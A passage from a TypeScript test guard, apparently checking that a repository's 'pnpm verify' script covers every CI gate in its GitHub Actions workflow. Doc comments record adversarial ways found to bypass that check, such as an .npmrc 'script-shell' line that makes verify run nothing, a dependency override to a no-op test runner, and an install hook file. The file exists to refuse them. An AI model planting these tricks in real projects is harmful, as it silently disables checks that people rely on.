 *   sentence above. A `uses:` step has no command text, so "changes what a
 *   command does without changing its text" was never a description of it. See
 *   {@link refuseEnvOnUses}.
 *
 * - **The four things that decide what a written command does, three of which
 *   this reader had no model of at all.** Defects seventeen to twenty are one
 *   diagnosis: the verify side's totality was asserted over a *token* where it
 *   was owed over an *invocation*, and an invocation has four factors. Where
 *   each stands now, so the next round starts from the boundary rather than
 *   from the last spelling of it:
 *
 *   1. *Which shell reads the body.* Refused, not modelled:
 *      {@link NPMRC_KEYS} makes `.npmrc` total and {@link SHELL_SETTING_FILES}
 *      pins which files may decide it. **Still unseen:** a `script-shell` set
 *      outside this repository — a user or global `.npmrc`, or
 *      `NPM_CONFIG_SCRIPT_SHELL` in the environment. That is not a tracked file,
 *      so it is not a thing a review of this repository could catch, which is
 *      the honest reason the line is drawn at the tree.
 *   2. *Which manifest a script name binds to.* Refused once a `cd` has moved
 *      the working directory — {@link VerifyCommand.rebound}. **Still unseen:**
 *      what any other program in the chain does to the working directory, since
 *      only `cd` is modelled as moving it.
 *   3. *Which other bodies the package manager runs unasked.* The lifecycle keys
 *      are refused outright by {@link LIFECYCLE_SCRIPTS}; the manifest key that
 *      decides which *dependencies* may run theirs is pinned by
 *      {@link ONLY_BUILT_DEPENDENCIES}; and a hook file written next to the
 *      manifest rather than in it — `.pnpmfile.cjs` — is a new file at the
 *      repository root, which {@link ROOT_FILES} now makes a review. That last
 *      one is defect twenty-two, and this bullet used to call the factor closed
 *      with only the first of the three in place. **Still unseen:** what a
 *      permitted dependency's install script actually does, which is not a file
 *      in this repository.
 *   4. *What the arguments do.* Bounded per program by
 *      {@link VERIFY_INVOCATIONS} rather than left open. **Still unseen:** what
 *      a script this repository owns does with the arguments it is handed —
 *      `node scripts/run-bash.mjs X` names a program that is here and says
 *      nothing about `X`, which is the first bullet in this list again.
 * - **What is at the root of this repository, beyond its files.** The pin in
 *   {@link ROOT_FILES} enumerates *files* at the top level and skips names
 *   {@link ROOT_IGNORED_PATTERNS} lists, each of which must be a line of
 *   `.gitignore`. Two things it does not cover, stated because a pin reads as
 *   more than it is. **Directories are not enumerated**, so a root directory
 *   some future tool loads unasked would not be seen; the only one in that class
 *   today is `node_modules`, which is the install's own output. And a mutation
 *   that replaces the enumeration's *result* with a copy of the pinned list is
 *   invisible to it — measured on the tree this comment ships in, twice:
 *   `ROOT_SURFACE = [...ROOT_FILES]` is `196 passed (196)`, exit 0. That is true
 *   of any pin whose expected value equals the truth, including
 *   {@link WORKFLOW_FILES}; what makes the enumeration more than a restatement
 *   is that {@link refuseScriptInterpretation} reads it, so emptying it is
 *   `2 failed | 194 passed (196)`, exit 1 twice.
 * - **Which package a program name resolves to.** `dependencies`,
 *   `devDependencies` and `pnpm-lock.yaml` decide what `vitest`, `vite` and
 *   `tsc` actually are, and this reader compares none of them: it asserts which
 *   *commands* run, not which bytes a command's name loads. That was always true
 *   — `pnpm test` has been the `pnpm test` gate here whatever `vitest` resolved
 *   to — and it is written down now because defect twenty-three's fix reads the
 *   manifest whole and could be over-read as closing it. What the fix does close
 *   is that a key nobody has read cannot sit in that document unremarked.
 * - **What GitHub's matcher does with a trigger this file has pinned.**
 *   {@link CI_TRIGGERS} is an equality against the events and filters a human
 *   read; it is not a claim about which pushes those filters select. The
 *   consequence worth stating: `branches: [main]` means a push to any other
 *   branch runs no CI at all, so a green here has never meant "CI ran these
 *   gates for this commit" — it means "the workflow that runs these gates is
 *   triggered on the events written down here". Defect twenty-five is that the
 *   file could not tell that arrangement from one filtered down to nothing.
 * - **`strategy:` on a job.** A matrix can multiply a job; the `run:` text it
 *   multiplies is fixed, because a `run:` carrying `${{ matrix.… }}` is refused.
 *   The multiplication itself is not modelled.
 * - **A step behind `if: false`.** The invariant is one-directional — `verify`
 *   may not be looser than CI — so a step the runner skips is not something
 *   this file objects to. Measured on the tree this comment ships in, twice:
 *   `if: false` on the `Typecheck` step of `static` is `196 passed (196)`,
 *   exit 0 twice.
 *
 *   **A job removed entirely is NOT in this list.** The version of this bullet
 *   that said it was is two rounds back, at `19b9f94`, where it read "so a step
 *   behind `if: false`, or a job removed entirely, is not something this file
 *   objects to"; the correction was written in round four and this sentence used
 *   to claim the round-four text was the thing being corrected, which is a claim
 *   about a version that already carried the fix.
 *
 *   What removing a job does now, measured on this tree, twice each. Deleting
 *   the whole `static:` job and nothing else is `no tests`, exit 1 twice — three jobs
 *   carry `needs: static`, and an unresolvable `needs:` is refused at module
 *   load (defect twenty-six). Deleting the job *and* those three lines, which is
 *   what the change would really look like, is `2 failed | 194 passed (196)`,
 *   exit 1, at *verify reaches the CI gate: 'cargo fmt --all --check'* and the
 *   same for `cargo clippy`, with `this test's list is stale: no workflow under
 *   .github/workflows/ runs "cargo fmt --all --check"`. It is the rows that go
 *   stale, not the invariant that objects — but the sentence in a "cannot see"
 *   list is read as an exemption, and this one was granting an exemption the
 *   file does not need and does not give. It also made round two's job-level
 *   `continue-on-error` hole look disclosed when nothing here had disclosed it.
 * - **A third-party `uses:` that somebody has read.** What
 *   `actions/checkout@v4` *does* is out of reach on purpose. What this
 *   repository *hands* it is not, and defect sixteen is that only the first
 *   was ever asked: `uses: actions/github-script@v7` with two `pnpm` and
 *   `cargo` invocations under `with: script:` was 141/141 green on the tree
 *   that shipped after round two, in a file this reader had just parsed line by
 *   line. So the remaining hole is not "what {@link isThirdPartyAction}
 *   accepts" — that sentence stood here and was measurably wrong about the
 *   size. It is **the five exact actions in {@link THIRD_PARTY_ACTIONS}, each
 *   with the `with:` keys listed beside it**, and it is bounded by five names
 *   rather than by a pattern. `isThirdPartyAction` still decides what reaches
 *   the pin at all, and is checked segment by segment for that reason.
 *
 *   **That sentence was itself the bound one round too narrow, which is defect
 *   twenty-one — and the sentence that replaced it was the same mistake one
 *   scope up, which is defect twenty-seven.** It said `with:`, and GitHub
 *   reaches the same inputs through `env: INPUT_<NAME>`; the correction said
 *   "both keys are refused on a `uses:` step now, so the bound is the five names
 *   times the inputs listed beside each, through either spelling", and round
 *   four falsified it by writing the same two lines in the job's `env:` block
 *   instead of the step's. An `INPUT_`-shaped key is refused in **any** `env:`
 *   block at any scope now ({@link refuseActionInputEnv}); measured on the tree
 *   this comment ships in, twice each, `INPUT_REPOSITORY` at workflow level and
 *   `INPUT_RUN_INSTALL` at job level are both `no tests`, exit 1, by name.
 *   What is still not bounded, stated rather than implied: this refusal
 *   recognises an input by the spelling `INPUT_<NAME>` (compared case-blind),
 *   because that is the mapping the pin is about. An input that reaches an
 *   admitted action by some other route is not something this reader has a model
 *   of, and neither is what those five actions *do* with what they are given.
 * - **What a key that cannot carry a command does.** Every key in
 *   {@link TOP_LEVEL_KEYS}, {@link JOB_KEYS} and {@link STEP_KEYS} is now
 *   either read by something below or in this sentence. Read (13): `jobs`,
 *   `defaults`, `steps`, `runs-on`, `run`, `uses`, `shell`, `with`,
 *   `continue-on-error` (both levels), `on` (defect twenty-five), `needs`
 *   (defect twenty-six), `env` (defect twenty-seven, at all three scopes), and
 *   `secrets`, which is refused by name. Consumed and compared with nothing (9):
 *   `name`, `run-name`, `concurrency`, `permissions`, `id`, `if`,
 *   `environment`, `outputs`, `timeout-minutes`. Each of *those* can only name,
 *   remove or reorder work, which is the one-directional weakening above —
 *   `on` and `needs` were in that list for four rounds under the same licence,
 *   and neither of them belonged there. 13 + 9 + `strategy` and
 *   `working-directory`, argued separately below, is 24, which is every distinct
 *   key in the three lists. An `env:` block is read for one thing: a key spelled
 *   the way GitHub spells an action input. What it changes about a `run:` gate
 *   whose text is unchanged is still not seen here. `env:` and `strategy:` are the two
 *   that could in principle change what a `run:` command *means*, and what
 *   bounds them there is checked rather than argued: a `run:` containing `${{`
 *   is refused by {@link modelOf}, a `$` outside single quotes is refused by
 *   {@link shellCommands}, and every surviving command's text is compared with
 *   {@link CI_GATES} by **equality** — so a matrix value cannot reach a
 *   command's text at all, and any other variable reference (`%FOO%` under
 *   `cmd`, a `$` inside single quotes) makes the text differ from every listed
 *   gate and lands in `unaccounted`.
 *   `working-directory:` is the one that genuinely escapes —
 *   measured on this tree, twice: moving the Clippy step's
 *   `working-directory: src-tauri` to another tree is `196 passed (196)`, exit
 *   0 twice.
 *
 * ### Two claims this file does not make
 *
 * 1. **Defects one, two and three are inherited, not re-measured.** The counts
 *    quoted for them (16/16, 17/17, 36/36) are what an earlier header recorded;
 *    no round since has reproduced them. Every other count in this file was
 *    printed by a run, on the tree named next to it: defects four, five and six
 *    on this tree at `run-start-2026-08-17`; defects seven to ten on the tree
 *    carrying the fix for four to six, whose full suite was 91; defect eleven on
 *    the tree carrying the fix for seven to ten, whose full suite was 117;
 *    defects twelve to sixteen and round two's two findings on the tree
 *    carrying the fix for eleven, whose full suite was 141; defects seventeen to
 *    twenty-one on the tree carrying the fix for twelve to sixteen, whose full
 *    suite was 172; defects twenty-two to twenty-seven on the tree carrying the
 *    fix for seventeen to twenty-one, whose full suite was 181. Every count
 *    quoted against **the tree this comment ships in** is out of 196, and every
 *    one of them was run twice this round with its exit code read from the log
 *    body — including the ones that were true at 181 and are re-stated here,
 *    which had to be re-run rather than re-scaled. The counts that appear inside
 *    function doc comments and case comments below — 89/89, 91/91, 115/115,
 *    116/116, 117/117, 141/141, 172/172, 181/181 — each name the tree that
 *    printed them, and each was printed by the round that made that change.
 *    **These are exact totals of one file's cases at one commit, not a range and
 *    not a bound** — the number moves whenever a case is added, and nothing
 *    about it is evidence for anything but the run that printed it.
 *
 *    Two of those series were graded and could not be reproduced from a commit,
 *    so they are marked here rather than left to look checkable: 89, 115 and 116
 *    are intra-round working states that were never committed, and the mutation
 *    counts attributed to trees before the immediately preceding one were each
 *    printed once, by the round that made the change, and not re-run since. The
 *    counts named against **the immediately preceding tree** (181) and against
 *    **this one** (196) were both run twice in this round.
 * 2. **Whether GitHub's own parser accepts `"run":` as a quoted mapping key was
 *    not established.** No YAML parser was run against GitHub. It does not
 *    matter here, and that is by construction rather than by luck: if GitHub
 *    accepts it, the step is a gate and this file now demands it be in `verify`;
 *    if GitHub rejects it, this file demands a gate CI does not run, which is an
 *    over-report costing a review. The `"uses":` half refuses either way. The
 *    error is in the safe direction under both answers, which is the only reason
 *    the question can be left open.
 *
 *    The same is true, and left open the same way, of whether GitHub accepts an
 *    expression in a `uses:` (defect eight). Under either answer the refusal is
 *    an over-report at worst. Neither question was closed, and closing either
 *    means running GitHub's parser, not reasoning about the specification.
 *
 *    Defect eleven's four spellings are the same open question and **not** the
 *    same shape of safe, which is worth stating plainly because it is what
 *    decided the fix. Whether GitHub resolves a target that hops out of the
 *    workflows directory with a parent segment, or one with a leading space,
 *    was not established here either — but the two answers
 *    are not symmetric. If the runner rejects them, refusing costs a review; if
 *    it accepts any single one of them, *admitting* them lets a gate reach CI
 *    unread with this file green. An error that is unsafe under one answer
 *    cannot be left to the answer, so every one of them is refused. This is the
 *    general rule the file now follows: an allow-branch must name a fact the
 *    reader established, and where there is no such fact the answer is a
 *    refusal, not a guess in the direction that happens to be quiet.
 * 3. **A newline in a workflow `run:` block is read as ending the gating
 *    chain.** Whether it does depends on the shell's `errexit`, which is not
 *    written in this file, and this reader does not assume the answer it would
 *    prefer. The consequence is that a gate on any line but the last of a
 *    `run: |` block reddens *every CI gate runs, and can fail the job it is
 *    listed in*. That is a false red if the shell does have `errexit`, and a
 *    false red is what this file trades for; the opposite choice would be a
 *    silent green on a genuinely suppressed gate. `ci.yml` today puts no gate in
 *    a multi-line block, so the choice costs nothing at the moment it is made,
 *    which is the honest reason it was affordable to make it this way.
 */

import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';

const REPO_ROOT = process.cwd();
const WORKFLOW_DIRECTORY = ['.github', 'workflows'] as const;

/** The two extensions GitHub Actions loads. */
const LOADED_EXTENSIONS = ['.yml', '.yaml'] as const;

/**
 * **Every workflow file this guard has read**, pinned by name.
 *
 * The pin is the point. Everything below asserts a property of the *union* of
 * these files, and a union silently absorbs a new member: a second workflow adds
 * its gates to what CI runs, and an assertion over the union is still satisfied
 * by the first file. So the membership itself is asserted. Adding a workflow
 * fails here, and the fix is to read the new file, decide what it is, and add
 * its name — which is the review that a second workflow deserves.
 */
const WORKFLOW_FILES = ['ci.yml'] as const;

/**
 * Files in `.github/workflows/` that GitHub Actions does **not** load, because
 * their extension is not one of {@link LOADED_EXTENSIONS}.
 *
 * Empty, and listed rather than skipped: a file sitting in the workflows
 * directory that nothing runs is either a mistake or a decision, and this is
 * where the decision gets written down.
 */
const IGNORED_WORKFLOW_FILES: readonly string[] = [];

/**
 * The root `package.json`, read **whole** rather than bound to the one key this
 * file wanted.
 *
 * It used to be `JSON.parse(…) as { scripts: Record<string, string> }`, and
 * every use site read `.scripts`. What that cast says is "the rest of this
 * document is not my business", which is the same sentence
 * {@link TOP_LEVEL_KEYS} exists to stop a workflow from saying. See
 * {@link MANIFEST_KEYS} for the key that made it false.
 */
const MANIFEST = JSON.parse(readFileSync(join(REPO_ROOT, 'package.json'), 'utf8')) as Record<
  string,
  unknown
>;

/* -------------------------------------------------------------------------- */
/* what decides how a script body is read                                     */
/* -------------------------------------------------------------------------- */

/**
 * The tracked files that can change **which shell** pnpm hands a script body to.
 *
 * Pinned by name for the reason {@link WORKFLOW_FILES} is: pnpm reads settings
 * from `.npmrc` and, since v10, from a pnpm-workspace file as well, and a
 * setting this reader never opened is one it cannot reason about. A file in this
 * list that is absent is fine; one that appears and is not in the list is
 * refused.
 *
 * Read by {@link refuseScriptInterpretation}, and by nothing else.
 */
const SHELL_SETTING_FILES = ['.npmrc', 'pnpm-workspace.yaml', 'pnpm-workspace.yml'] as const;

/**
 * The `.npmrc` keys this reader knows do not change how a script body is read.
 *
 * The list is the point, and it is the same inversion as {@link TOP_LEVEL_KEYS}:
 * an unrecognised key is **refused** rather than skipped, so a setting nobody
 * thought of is a review instead of a silent green.
 *
 * ### Defect twenty: the verify side had no `defaults.run.shell`
 *
 * Defect nine is that a step-level `shell:` this reader could not split was
 * refused by name, while the identical setting written as `defaults: run:
 * shell:` was listed as a known key and never read — and the argument written
 * for making that one a refusal was that "it changes how this reader may split a
 * body at all". The verify side had exactly that hole and no reader for it at
 * all: `shellCommands` assumes POSIX `&&`, `||`, `;` and `|` for every script
 * body, and what actually interprets those bytes is pnpm's `script-shell`, which
 * lives in this repository's own tracked `.npmrc`. Before this round the token
 * `npmrc` occurred zero times in this file.
 *
 * Measured on the tree that shipped after round three, twice: appending one line
 *
 *     script-shell=C:/Program Files/Git/usr/bin/true.exe
 *
 * to the tracked `.npmrc` — `package.json` and `ci.yml` byte-identical — was
 * `172 passed (172)`, exit 0. The runtime half, established in a scratch package
 * on pnpm 10.33.0 rather than in the worktree: with a body of
 * `node -e "console.log('GATE_A_RAN')" && node -e "console.log('GATE_B_RAN')"`,
 * `pnpm verify` under that `.npmrc` printed the body, printed **neither** gate
 * line (`grep -nx GATE_A_RAN` and `grep -nx GATE_B_RAN` both exit 1) and exited
 * 0; with the `.npmrc` removed the same body printed `GATE_A_RAN` on line 5 and
 * `GATE_B_RAN` on line 6. A guard whose top line is "`pnpm verify` must be a
 * superset of CI" certified, at 172/172, a tree in which `pnpm verify` executes
 * nothing — and CI's own `pnpm test` step with it, which is defect six's
 * relationship (this file certifying the empty set) reached through a file
 * instead of through a script body.
 *
 * What this reader does **not** do is decide what a shell other than the default
 * would do with `&&`. It refuses the key, because the value it would have to
 * reason about is a program somewhere on the machine.
 *
 * Read by {@link refuseScriptInterpretation}, and by nothing else.
 */
const NPMRC_KEYS: readonly string[] = [
  // Neither of these two reaches a script body: they decide what the installer
  // does with peer dependencies in the module tree.
  'strict-peer-dependencies',
  'auto-install-peers',
];

/**
 * Refuse anything in this repository that decides how a script body is
 * interpreted, and that this reader has not been taught to resolve.
 *
 * The verify side's counterpart to `modelOf`'s `defaults.run.shell` refusal, and
 * written to the same rule: an allow-branch must name a fact the reader
 * established. `script-shell` and `shell-emulator` are named in the message
 * because they are the two keys whose whole job is this, but the branch that
 * refuses is the *default* one — an unknown key is refused whether or not
 * anybody has heard of it.
 *
 * *Which* of these files is present is answered by {@link readRootSurface}
 * rather than by an `existsSync` of this function's own. Two independent answers
 * to "what is at the root of this repository" can disagree, and the whole point
 * of the enumeration is that there is one answer — this is also what gives that
 * enumeration a reader that changes a verdict, rather than only an equality
 * against the list it is pinned to.
 *
 * Read at module load, and by *the shell that reads a script body is one this
 * reader assumed*. Load-bearing, measured on the tree this comment ships in,
 * twice each: making the unknown-key branch return instead of throw is
 * `1 failed | 195 passed (196)`, exit 1 twice, and dropping `.npmrc` from
 * {@link SHELL_SETTING_FILES} is the same — both at that case, because the
 * tracked `.npmrc` carries only keys {@link NPMRC_KEYS} lists and a rule over
 * clean input asserts nothing. Emptying {@link ROOT_SURFACE}, which is the
 * wiring rather than the rule, is `2 failed | 194 passed (196)`, exit 1 twice —
 * that case and the root pin together, because a `.npmrc` the enumeration never
 * reported is a `.npmrc` this reader never opened.
 */
function refuseScriptInterpretation(repoRoot: string, rootFiles: readonly string[]): readonly string[] {
  const present = SHELL_SETTING_FILES.filter((file) => rootFiles.includes(file));

  for (const file of present) {
    if (file !== '.npmrc') {
      throw new Error(
        `${file} decides how pnpm reads a script body — it is where "script-shell" ` +
          'and "shell-emulator" live in pnpm 10 — and this reader has no parser ' +
          'for it. Every command in "pnpm verify" is split on POSIX shell ' +
          'operators by this file, so a setting that changes the shell changes ' +
          'what every assertion here is about.',
      );
    }
    const text = readFileSync(join(repoRoot, file), 'utf8');
    text.split(/\r?\n/u).forEach((line, at) => {
      const trimmed = line.trim();
      if (trimmed === '' || trimmed.startsWith('#') || trimmed.startsWith(';')) return;
      const split = trimmed.indexOf('=');
      const key = (split < 0 ? trimmed : trimmed.slice(0, split)).trim().toLowerCase();
      if (NPMRC_KEYS.includes(key)) return;
      throw new Error(
        `${file}:${String(at + 1)} sets "${key}", which this reader has not been ` +
          'told about. `.npmrc` is where pnpm\'s "script-shell" lives, and one ' +
          'line there hands every command in "pnpm verify" to a program of ' +
          "somebody's choosing — including a program that runs nothing and exits " +
          '0, which this guard would certify at full green. Decide what the ' +
          'setting does to a script body, then add it to NPMRC_KEYS.',
      );
    });
  }

  return present;
}

/* -------------------------------------------------------------------------- */
/* which documents exist at all                                               */
/* -------------------------------------------------------------------------- */

/**
 * **Every file at the top level of this repository**, pinned by name.
 *
 * ### Defect twenty-two: a list of files to open is not a claim about a directory
 *
 * {@link SHELL_SETTING_FILES} names three files, refuses any of them it cannot
 * parse, and reads the one that is here. Round five's adversary pointed out what
 * that list does *not* say: it is a list of files to **open**, not a statement
 * about what is in the directory, so a fourth filename is not refused — it is
 * invisible. The construction was a tracked `.pnpmfile.cjs` at the repository
 * root, whose `readPackage` hook is a JavaScript body pnpm runs during
 * `pnpm install` — the one command {@link SETUP_COMMANDS} exempts by name, which
 * CI runs in three jobs and `pnpm verify` runs in none. Measured on the tree
 * that shipped after round four, twice: `181 passed (181)`, exit 0, with
 * `ci.yml` and `package.json` byte-identical. The byte-equivalent work written
 * as the manifest key {@link LIFECYCLE_SCRIPTS} closed — a root `postinstall` —
 * was red twice at *the setup exemption for "pnpm install" covers no work of its
 * own*. One referent, two places to write it, opposite verdicts: this file's own
 * recurring class, landing one file over from the key it had just pinned.
 *
 * So the fix is the one {@link WORKFLOW_FILES} already makes for
 * `.github/workflows/`, and it is deliberately not a fifth filename: the
 * **membership of the directory** is asserted, so any new root file is a review
 * rather than a silence. That is what makes it a fix for the class instead of
 * for `.pnpmfile.cjs`.
 *
 * What is **not** established here: whether pnpm runs a `readPackage` hook under
 * `--frozen-lockfile`, and what any particular new root file would do. Neither
 * question has to be answered, for the reason the header gives for defect
 * eleven's spellings — the assertion is "somebody read this file", and an
 * over-report costs a review while a miss costs a green.
 *
 * Read by *every file at the repository root is one this guard has been shown*,
 * and by nothing else — {@link readRootSurface} does not consult it, which is
 * the point: the enumeration answers what is there and this list answers what
 * was read. Load-bearing, measured on
 * the tree this comment ships in, twice each: adding a `.pnpmfile.cjs` to the
 * root is `1 failed | 195 passed (196)`, exit 1, at that case, and emptying
 * {@link ROOT_SURFACE} is `2 failed | 194 passed (196)`, exit 1 — that case and
 * the `.npmrc` one, since {@link refuseScriptInterpretation} reads the same
 * enumeration. What is NOT caught, and is in the header's "cannot see" list
 * rather than left to be found: replacing the enumeration's result with a copy
 * of this list is `196 passed (196)`, exit 0 twice.
 */
const ROOT_FILES = [
  '.gitattributes',
  '.gitignore',
  '.npmrc',
  'README.md',
  'index.html',
  'package.json',
  'pnpm-lock.yaml',
  'tsconfig.app.json',
  'tsconfig.harness.json',
  'tsconfig.json',
  'tsconfig.node.json',
  'tsconfig.uibridge.json',
  'vite.config.ts',
] as const;

/**
 * Names at the repository root that this enumeration skips, each of which must
 * be a line git is already told to ignore.
 *
 * A pin over a working tree has to survive the working tree. `.gitignore` names
 * every one of these lines itself — `*.tsbuildinfo`, `*.log`, `*.swp`, `*.db`,
 * `.env`, `.DS_Store`, `Thumbs.db` — which is this repository's own statement
 * that files of those names turn up in a checkout and are not part of it, so a
 * pin that reddened on them would be a pin somebody deletes. The skip is tied to
 * that fact rather than to this list's own say-so: {@link readRootSurface}
 * refuses to start unless every pattern here occurs verbatim as a line of the
 * tracked `.gitignore`, so nothing can be skipped here that git would carry into
 * a commit — and `.pnpmfile.cjs`, which git tracks, cannot be written into this
 * list without also being written into `.gitignore`, where it would then not
 * reach CI at all.
 *
 * Spellings are limited to `*.suffix` and a whole filename, and anything else is
 * refused: a pattern language this reader half-implements is a pattern language
 * that skips a file somebody thought was pinned.
 *
 * Read by {@link readRootSurface} — which module load hands this list and the
 * cases hand a scratch root and a list of their own — and by nothing else.
 */
const ROOT_IGNORED_PATTERNS: readonly string[] = [
  '*.tsbuildinfo',
  '*.log',
  '*.swp',
  '*.db',
  '.env',
  '.DS_Store',
  'Thumbs.db',
];

/**
 * The files at the top level of the repository, sorted, minus the ignored ones.
 *
 * Directories are **not** enumerated and that is a stated limit rather than an
 * oversight: what this closes is a *file* pnpm or node loads without anybody
 * naming it, and the only root directory in that class is `node_modules`, which
 * is the install's own output. A root directory that carried such a file — a
 * hypothetical `config/` some future tool reads — would not be seen here.
 *
 * Read in two places: *every file at the repository root is one this guard has
 * been shown*, which pins the membership, and
 * {@link refuseScriptInterpretation}, which asks it which of
 * {@link SHELL_SETTING_FILES} are present rather than asking the disk a second
 * time. The second reader is what makes emptying {@link ROOT_SURFACE} a red
 * instead of a shrug.
 */
function readRootSurface(repoRoot: string, patterns: readonly string[]): readonly string[] {
  // Read only when there is a skip to justify, so a scratch root with nothing to
  // skip can be enumerated by a case without carrying a `.gitignore` it would
  // then be asserting nothing about.
  const ignoreLines =
    patterns.length === 0
      ? new Set<string>()
      : new Set(
          readFileSync(join(repoRoot, '.gitignore'), 'utf8')
            .split(/\r?\n/u)
            .map((line) => line.trim()),
        );
  for (const pattern of patterns) {
    const spelling = pattern.startsWith('*') ? pattern.slice(1) : pattern;
    if (spelling.includes('*') || spelling.includes('/') || spelling.includes('?')) {
      throw new Error(
        `ROOT_IGNORED_PATTERNS carries "${pattern}", which is not a spelling this ` +
          'reader implements. It matches a whole filename or a "*.suffix", and ' +
          'nothing else, because a pattern language it half-implements would skip ' +
          'a file somebody thought this list had pinned.',
      );
    }
    if (!ignoreLines.has(pattern)) {
      throw new Error(
        `ROOT_IGNORED_PATTERNS skips "${pattern}" at the repository root, but ` +
          '.gitignore does not carry that line, so git would commit such a file ' +
          'and this guard would never see it. Add it to .gitignore or stop ' +
          'skipping it here.',
      );
    }
  }

  const ignored = (name: string): boolean =>
    patterns.some((pattern) =>
      pattern.startsWith('*') ? name.endsWith(pattern.slice(1)) : name === pattern,
    );

  // `.git` is git's own store, and it is the one name whose *type* varies with
  // how the tree was made: a directory in a clone, a one-line file pointing at
  // the real store in a linked worktree — which is what this tree is. It is
  // never a tracked file in either shape, so it is skipped by name rather than
  // pinned, and it is skipped here rather than in ROOT_IGNORED_PATTERNS because
  // that list's rule is "`.gitignore` carries this line" and `.gitignore` does
  // not carry `.git`.
  return readdirSync(repoRoot, { withFileTypes: true })
    .filter((item) => !item.isDirectory() && item.name !== '.git' && !ignored(item.name))
    .map((item) => item.name)
    .sort();
}

const ROOT_SURFACE: readonly string[] = readRootSurface(REPO_ROOT, ROOT_IGNORED_PATTERNS);

const SHELL_SETTINGS: readonly string[] = refuseScriptInterpretation(REPO_ROOT, ROOT_SURFACE);

/* -------------------------------------------------------------------------- */
/* what the manifest decides besides the scripts                              */
/* -------------------------------------------------------------------------- */

/**
 * Every top-level key of the root `package.json`, listed the way
 * {@link TOP_LEVEL_KEYS} lists a workflow's: an unrecognised key is **refused**
 * rather than skipped.
 *
 * ### Defect twenty-three: the manifest was opened for one key and configured in another
 *
 * Round five's adversary found this one in the tree rather than in a
 * construction. `package.json` already carries a `"pnpm"` block a few lines
 * below the `scripts` object, and the key in it — `onlyBuiltDependencies` —
 * decides **which dependency install scripts pnpm is allowed to run**, which is
 * factor 3 of the header's four-factor list, the factor the header called
 * closed. This file bound the manifest as `{ scripts }` and read `.scripts` at
 * every use site, so that block was read past in silence. Adding a sibling key
 * to it — `"overrides": { "vitest": "npm:@vela/noop-vitest@1.0.0" }` — with
 * `ci.yml` and `.npmrc` byte-identical, was **`181 passed (181)`, exit 0**,
 * twice, on the tree that shipped after round four.
 *
 * The refusal is the default branch, not a rule about `overrides` in
 * particular: this reader has been told what two keys of that block mean and
 * refuses the rest, exactly as {@link NPMRC_KEYS} does for `.npmrc`.
 *
 * **The limit this does not close, stated rather than implied.**
 * `dependencies` and `devDependencies` are listed below as known and are
 * compared with nothing, and they decide which package a program name resolves
 * to just as `pnpm.overrides` would. That is not an oversight and refusing them
 * would be absurd — it is the boundary the header's first "cannot see" bullet
 * already draws: this reader asserts *which commands run*, not *which bytes a
 * command's name loads*. `pnpm test` has always been the `pnpm test` gate here
 * whatever `vitest` resolves to. What the pin below adds is that a key nobody
 * has read cannot sit in the manifest unremarked; it does not add a claim about
 * resolution.
 *
 * Read by {@link refuseManifestKeys}, and by nothing else. Load-bearing,
 * measured on the tree this comment ships in, twice: making the unknown-key
 * branch unreachable is `1 failed | 195 passed (196)`, exit 1, at *the manifest
 * is read whole, not for the one key this file wanted* — the real manifest
 * carries only keys this list names, so the rule has to be asked about a
 * manifest this tree does not contain.
 */
const MANIFEST_KEYS: readonly string[] = [
  // Read: the chain starts at `scripts.verify`, and the block below is taken
  // apart key by key.
  'scripts',
  'pnpm',
  // Identity and metadata. None of these is a body anything executes.
  'name',
  'version',
  'private',
  'type',
  'description',
  'license',
  'engines',
  // The dependency sets — known, compared with nothing, and the limit that
  // implies is stated in this list's doc rather than left to be discovered.
  'dependencies',
  'devDependencies',
];

/**
 * The keys of the manifest's `pnpm` block this reader has been told about.
 *
 * `onlyBuiltDependencies` is here rather than refused because its whole job is
 * the question factor 3 asks — which dependency install scripts pnpm may run —
 * and the honest treatment of it is not a refusal but a **pin on its
 * membership**: see {@link ONLY_BUILT_DEPENDENCIES}. Every other key of that
 * block is refused by the default branch of {@link refuseManifestKeys}.
 *
 * Read by {@link refuseManifestKeys}, and by nothing else. Load-bearing,
 * measured on the tree this comment ships in, twice: making that branch
 * unreachable is `1 failed | 195 passed (196)`, exit 1, at the same case — and
 * on the real `package.json` it is what turns the adversary's `overrides` key
 * from `181 passed (181)` into a module-load refusal, `no tests`, exit 1 twice.
 */
const PNPM_MANIFEST_KEYS: readonly string[] = ['onlyBuiltDependencies'];

/**
 * The dependencies whose own install scripts pnpm is permitted to run.
 *
 * This is the key pnpm 10 reads to decide which dependencies may run their own
 * build scripts. **What pnpm does with it was not established here** — no
 * `pnpm install` was run in this worktree — and the assertion does not turn on
 * it: whatever the runtime rule is, a name added to this list is a third-party
 * body somebody decided to allow, and the answer to that is a review rather than
 * a guess. The header records the residue of factor 3 as "a dependency's own
 * install scripts, which are not in this repository"; the *decision about which
 * of them are permitted* is in this repository, and it is this line. Asserted by
 * equality, so adding a package reddens this file — the same trade
 * {@link SETUP_COMMANDS} makes for the apt package list.
 *
 * What runs inside `esbuild`'s install script is not read here and cannot be:
 * it is not a file in this tree.
 *
 * Read by {@link refuseManifestKeys}, and by nothing else. Load-bearing,
 * measured on the tree this comment ships in, twice: making the comparison
 * unreachable is `1 failed | 195 passed (196)`, exit 1, at *the manifest is read
 * whole, not for the one key this file wanted*, which asks it about a list this
 * repository does not have.
 */
const ONLY_BUILT_DEPENDENCIES: readonly string[] = ['esbuild'];

/**
 * Refuse a manifest key this reader has not been told about, and return the keys
 * of its `pnpm` block.
 *
 * A named function taking the manifest as an argument, for the reason
 * {@link lifecycleScriptsIn} is one: the real manifest satisfies every rule
 * here, so a rule written inline at module load would only ever see input that
 * satisfies it and could be deleted without anything going red. Its cases are in
 * *the manifest is read whole, not for the one key this file wanted*, which
 * hands it manifests this tree does not contain.
 */
function refuseManifestKeys(manifest: Record<string, unknown>): readonly string[] {
  for (const key of Object.keys(manifest)) {
    if (!MANIFEST_KEYS.includes(key)) {
      throw new Error(
        `package.json has a top-level key this reader has not been told about: ` +
          `"${key}". The manifest is where "pnpm install" finds work nobody ` +
          'wrote in a command — lifecycle bodies, and the settings that decide ' +
          'which dependency install scripts run — so a key read by nothing here ' +
          'is a body this guard cannot see. Decide what it does, then add it to ' +
          'MANIFEST_KEYS.',
      );
    }
  }

  const scripts = manifest['scripts'];
  if (typeof scripts !== 'object' || scripts === null || Array.isArray(scripts)) {
    throw new Error('package.json has no "scripts" mapping, so there is no verify chain to read');
  }
